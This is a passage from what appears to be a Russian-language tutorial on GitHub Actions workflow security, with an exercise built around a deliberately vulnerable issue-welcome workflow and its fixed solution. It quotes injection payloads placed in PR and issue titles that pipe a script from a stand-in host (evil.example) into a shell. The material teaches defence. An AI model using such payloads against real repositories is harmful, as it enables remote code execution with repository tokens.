@@ -1,0 +1,48 @@
+<section id="ci-security">
+<h2>Безопасность workflow</h2>
+<p>Workflow выполняет код с доступом к секретам и правом писать в репозиторий, поэтому его защищают как продакшен-сервер:</p>
+<ul><li><b>Минимум прав.</b> Блок <code>permissions</code> на уровне файла или задания: по умолчанию <code>contents: read</code>, остальное — точечно. Токен <code>GITHUB_TOKEN</code> получает только перечисленные права.</li><li><b>Закреплять сторонние действия.</b> Тег <code>@v1</code> автор может перевесить на другой код. Для чужих действий надёжнее полный SHA коммита: <code>uses: someone/action@8f4b7f8...</code>. В 2025 году взлом популярного действия <code>tj-actions/changed-files</code> показал, чем это грозит: перевешенные теги начали выводить секреты в логи (из общих знаний).</li><li><b>Не подставлять данные события в <code>run</code>.</b> <code>run: echo "${{ github.event.pull_request.title }}"</code> вставляет заголовок PR прямо в текст скрипта. Заголовок <code>"; curl evil.example | sh; "</code> выполнится. Значения передают через <code>env</code> и используют как переменную оболочки: <code>"$TITLE"</code>.</li><li><b>Осторожно с <code>pull_request_target</code>.</b> Это событие запускается с секретами и правами целевого репозитория даже для PR из чужого форка. Запускать в нём код из PR нельзя.</li></ul>
+<article class="task" id="ci-t-injection" data-task="ci-cd/ci-t-injection">
+<h4>Задача 8. Уязвимый workflow <span class="lvl">★★★ с подвохом</span></h4>
+<p>Workflow ниже приветствует автора нового issue и ставит метку. Найдите две проблемы безопасности и исправьте их.</p>
+<pre><code># .github/workflows/welcome.yml
+# on:
+#   issues:
+#     types: [opened]
+# jobs:
+#   welcome:
+#     runs-on: ubuntu-latest
+#     steps:
+#       - run: |
+#           echo "Новый issue: ${{ github.event.issue.title }}"
+#           gh issue edit ${{ github.event.issue.number }} --add-label triage
+#         env:
+#           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}</code></pre>
+<p class="why"><b>Зачем:</b> заголовок issue пишет кто угодно в интернете. Подстановка <code>${{ }}</code> происходит до запуска оболочки, поэтому заголовок <code>"; curl https://evil.example/x.sh | sh; echo "</code> выполнится с токеном репозитория. Такие уязвимости находили в workflow крупных открытых проектов (из общих знаний).</p>
+<details class="q spoiler"><summary>Решение и разбор</summary><div class="a">
+<pre><code>// welcome.yml
+name: Welcome
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  issues: write
+
+jobs:
+  welcome:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "Новый issue: $TITLE"
+          gh issue edit "$NUMBER" --add-label triage --repo "$REPO"
+        env:
+          TITLE: ${{ github.event.issue.title }}
+          NUMBER: ${{ github.event.issue.number }}
+          REPO: ${{ github.repository }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}</code></pre>
+<p>Первая проблема — подстановка данных события прямо в скрипт. Значения уходят в <code>env</code>, а скрипт использует переменные оболочки в кавычках. Оболочка не исполняет содержимое переменной, она подставляет его как строку. Вторая проблема — нет блока <code>permissions</code>: токен получал права по умолчанию, которые в старых репозиториях включают запись в код. Теперь у него только <code>issues: write</code>. <code>--repo</code> нужен потому, что шага <code>checkout</code> нет и <code>gh</code> не знает, в каком он репозитории.</p>
+</div></details>
+<button type="button" class="task-done" data-task-done aria-pressed="false">Отметить решённой</button>
+</article>
+</section>
